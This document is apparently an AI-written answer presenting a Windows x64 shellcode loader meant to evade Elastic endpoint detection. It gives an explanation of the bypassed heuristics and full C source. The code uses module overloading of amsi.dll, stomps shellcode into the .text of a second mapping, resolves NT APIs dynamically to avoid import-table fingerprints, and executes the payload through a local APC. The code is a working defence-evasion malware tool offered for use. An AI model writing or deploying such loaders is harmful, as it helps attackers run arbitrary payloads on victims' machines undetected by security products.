### EXPLANATION

1. **Analysis of the baseline detection surface**
   The simplest loader (VirtualAlloc RWX → memcpy → CreateThread) trips several Elastic rules at once: `PAGE_EXECUTE_READWRITE` allocation, unbacked/private memory execution, and a thread start pointing at a private region. Even the "RW → RX" variant leaves a private (unbacked) executable VAD entry and a fresh thread whose start address resolves to no module on disk — a classic call-stack origin heuristic.

2. **Why module overloading (dual SEC_IMAGE mapping) bypasses these**
   - We map a legitimate, signed, on-disk DLL (here `C:\Windows\System32\amsi.dll`) **twice** as `SEC_IMAGE` sections. `SEC_IMAGE` views arrive already mapped as `PAGE_EXECUTE_READ` and are **file-backed**, so the executable pages have a legitimate module path in the VAD — no "unbacked/private executable memory" heuristic fires.
   - View **A** stays byte-identical to disk (the "cover"): any module-integrity / disk-vs-memory comparison against the on-disk file passes.
   - View **B** is a second `SEC_IMAGE` mapping of the same file; we locate its `.text` section and copy the payload there. Because the section is file-backed and RX, `NtProtectVirtualMemory` is used only to flip `.text` to RW for the copy and back to RX — no `VirtualAlloc`/`VirtualAllocEx`/`WriteProcessMemory` and no RWX anywhere.
   - Execution is dispatched via **APC on a local alertable thread** (`QueueUserAPC` + `SleepEx`) rather than a fresh `CreateThread` whose start address is unbacked. The APC routine lives in our own module and its target is module-backed memory.
   - All sensitive NT calls (`NtCreateSection`, `NtMapViewOfSection`, `NtProtectVirtualMemory`, `NtClose`) are declared by hand and resolved dynamically from `ntdll.dll` via `GetProcAddress`, so no import-table fingerprint of those APIs exists in the loader's IAT.

3. **Techniques selected**
   - **module_overloading** (user-preferred): dual `SEC_IMAGE` mapping of a signed DLL, cover view untouched.
   - **apc_injection** (local): `QueueUserAPC` + `SleepEx` to trigger execution without a new thread start pointing at private memory.
   - **RW_to_RX**: `.text` is only briefly RW during the copy and restored to RX — no RWX allocation ever exists.
   - **api_surface_translation** (partial): NT functions resolved dynamically, not statically linked, to avoid IAT-based `api.name` matching.

### TECHNIQUES_USED
- module_overloading
- apc_injection
- RW_to_RX
- api_surface_translation

### CODE
```c
/*
 * x64 Windows shellcode loader - Iteration 1 (baseline)
 *
 * Technique: Module Overloading (dual SEC_IMAGE mapping of a signed DLL)
 *            + local APC execution + RW_to_RX.
 *
 * Reads raw shellcode from argv[1]. No hardcoded payload bytes.
 *
 * Build (MSVC x64):
 *   cl.exe /nologo /O2 /W3 loader.c
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* Minimal NT API declarations (not all present in <winternl.h>)       */
/* ------------------------------------------------------------------ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING_LOCAL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_LOCAL;

typedef struct _OBJECT_ATTRIBUTES_LOCAL {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING_LOCAL *ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES_LOCAL;

/* NtCreateSection / NtMapViewOfSection / NtProtectVirtualMemory prototypes */
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    OBJECT_ATTRIBUTES_LOCAL *ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE           SectionHandle,
    HANDLE           ProcessHandle,
    PVOID           *BaseAddress,
    ULONG_PTR        ZeroBits,
    SIZE_T           CommitSize,
    PLARGE_INTEGER   SectionOffset,
    PSIZE_T          ViewSize,
    DWORD            InheritDisposition,
    ULONG            AllocationType,
    ULONG            Win32Protect);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE   ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T  RegionSize,
    ULONG    NewProtect,
    PULONG   OldProtect);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

/* ------------------------------------------------------------------ */
/* Globals passed to the APC                                           */
/* ------------------------------------------------------------------ */
static PVOID g_payload = NULL;

/* ------------------------------------------------------------------ */
/* APC routine: runs shellcode in alertable thread context             */
/* ------------------------------------------------------------------ */
static VOID CALLBACK ApcRoutine(ULONG_PTR dwParam)
{
    (void)dwParam;
    if (g_payload) {
        /* Execute shellcode */
        ((void (*)(void))g_payload)();
    }
}

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;

    if (fopen_s(&fp, path, "rb") != 0 || fp == NULL) {
        fprintf(stderr, "[-] fopen_s failed for %s\n", path);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); fprintf(stderr, "[-] empty file\n"); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }

    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf); fclose(fp); return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

/* Find a section by name inside a mapped PE image (case-insensitive). */
static PIMAGE_SECTION_HEADER find_section(PIMAGE_NT_HEADERS nt,
                                          const char *name)
{
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD i;
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        char sname[9];
        memcpy(sname, sec->Name, 8);
        sname[8] = '\0';
        if (_stricmp(sname, name) == 0) {
            return sec;
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */
int main(int argc, char *argv[])
{
    unsigned char *shellcode = NULL;
    size_t         shellcode_size = 0;

    HMODULE        hNtdll = NULL;
    pNtCreateSection        NtCreateSection        = NULL;
    pNtMapViewOfSection     NtMapViewOfSection     = NULL;
    pNtUnmapViewOfSection   NtUnmapViewOfSection   = NULL;
    pNtProtectVirtualMemory NtProtectVirtualMemory = NULL;
    pNtClose                NtClose                = NULL;

    HANDLE         hFile = INVALID_HANDLE_VALUE;
    HANDLE         hSection = NULL;
    PVOID          viewA = NULL;   /* cover mapping (untouched)        */
    PVOID          viewB = NULL;   /* payload mapping (stomped .text)  */
    SIZE_T         viewSize = 0;

    NTSTATUS       status;
    ULONG          oldProt = 0;
    PVOID          protBase = NULL;
    SIZE_T         protSize = 0;

    DWORD          tid = 0;
    HANDLE         hThread = NULL;

    /* Signed, always-present system DLL used as the cover module. */
    const wchar_t *coverDll = L"C:\\Windows\\System32\\amsi.dll";

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    shellcode = read_file(argv[1], &shellcode_size);
    if (!shellcode) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] shellcode size: %zu bytes\n", shellcode_size);

    /* ---- Resolve NT APIs dynamically (no IAT fingerprint) ---- */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        fprintf(stderr, "[-] ntdll not found\n");
        return 1;
    }
    NtCreateSection        = (pNtCreateSection)        GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection     = (pNtMapViewOfSection)     GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection   = (pNtUnmapViewOfSection)   GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtProtectVirtualMemory = (pNtProtectVirtualMemory) GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtClose                = (pNtClose)                GetProcAddress(hNtdll, "NtClose");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection ||
        !NtProtectVirtualMemory || !NtClose) {
        fprintf(stderr, "[-] failed to resolve ntdll exports\n");
        return 1;
    }

    /* ---- Open the cover DLL ---- */
    hFile = CreateFileW(coverDll,
                        GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFileW(%ls) failed: %lu\n", coverDll, GetLastError());
        return 1;
    }

    /* ---- Create a SEC_IMAGE section from the DLL ---- */
    status = NtCreateSection(&hSection,
                             SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_MAP_WRITE,
                             NULL,
                             NULL,
                             PAGE_EXECUTE_READ,
                             SEC_IMAGE,
                             hFile);
    CloseHandle(hFile);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n", (unsigned long)status);
        return 1;
    }

    /* ---- Map view A (clean cover, untouched) ---- */
    viewSize = 0;
    viewA = NULL;
    status = NtMapViewOfSection(hSection,
                                GetCurrentProcess(),
                                &viewA,
                                0,
                                0,
                                NULL,
                                &viewSize,
                                1 /* ViewUnmap */,
                                0,
                                PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtMapViewOfSection(A) failed: 0x%08lX\n", (unsigned long)status);
        NtClose(hSection);
        return 1;
    }
    printf("[+] cover mapping A at %p (size 0x%zX)\n", viewA, viewSize);

    /* ---- Map view B (payload host) ---- */
    {
        SIZE_T viewBSize = 0;
        viewB = NULL;
        status = NtMapViewOfSection(hSection,
                                    GetCurrentProcess(),
                                    &viewB,
                                    0,
                                    0,
                                    NULL,
                                    &viewBSize,
                                    1 /* ViewUnmap */,
                                    0,
                                    PAGE_READONLY);
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtMapViewOfSection(B) failed: 0x%08lX\n", (unsigned long)status);
            NtUnmapViewOfSection(GetCurrentProcess(), viewA);
            NtClose(hSection);
            return 1;
        }
        printf("[+] payload mapping B at %p (size 0x%zX)\n", viewB, viewBSize);
    }

    /* ---- Locate .text in view B and copy the payload there ---- */
    {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)viewB;
        PIMAGE_NT_HEADERS nt;
        PIMAGE_SECTION_HEADER text;
        BYTE *textBase;
        SIZE_T textSize;

        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            fprintf(stderr, "[-] bad DOS header in mapped image\n");
            goto cleanup;
        }
        nt = (PIMAGE_NT_HEADERS)((BYTE *)viewB + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            fprintf(stderr, "[-] bad NT header in mapped image\n");
            goto cleanup;
        }

        text = find_section(nt, ".text");
        if (!text) {
            fprintf(stderr, "[-] .text section not found\n");
            goto cleanup;
        }
        textBase = (BYTE *)viewB + text->VirtualAddress;
        textSize = text->Misc.VirtualSize;

        if (shellcode_size > textSize) {
            fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                    shellcode_size, textSize);
            goto cleanup;
        }

        /* Flip .text to RW so we can copy, then back to RX (RW_to_RX). */
        protBase = textBase;
        protSize = textSize;
        status = NtProtectVirtualMemory(GetCurrentProcess(),
                                        &protBase,
                                        &protSize,
                                        PAGE_READWRITE,
                                        &oldProt);
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtProtectVirtualMemory(RW) failed: 0x%08lX\n",
                    (unsigned long)status);
            goto cleanup;
        }

        memcpy(textBase, shellcode, shellcode_size);

        status = NtProtectVirtualMemory(GetCurrentProcess(),
                                        &protBase,
                                        &protSize,
                                        PAGE_EXECUTE_READ,
                                        &oldProt);
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtProtectVirtualMemory(RX) failed: 0x%08lX\n",
                    (unsigned long)status);
            goto cleanup;
        }

        g_payload = (PVOID)textBase;
        printf("[+] payload staged at %p (module-backed, RX)\n", g_payload);
    }

    /* ---- Execute via local APC on an alertable thread ---- */
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SleepEx,
                           (LPVOID)INFINITE, CREATE_SUSPENDED, &tid);
    if (!hThread) {
        fprintf(stderr, "[-] CreateThread failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (QueueUserAPC((PAPCFUNC)ApcRoutine, hThread, 0) == 0) {
        fprintf(stderr, "[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        goto cleanup;
    }

    ResumeThread(hThread);

    /* Wait for the payload thread to finish (calc will exit quickly). */
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

cleanup:
    if (viewB) NtUnmapViewOfSection(GetCurrentProcess(), viewB);
    if (viewA) NtUnmapViewOfSection(GetCurrentProcess(), viewA);
    if (hSection) NtClose(hSection);
    if (shellcode) free(shellcode);
    return 0;
}
```
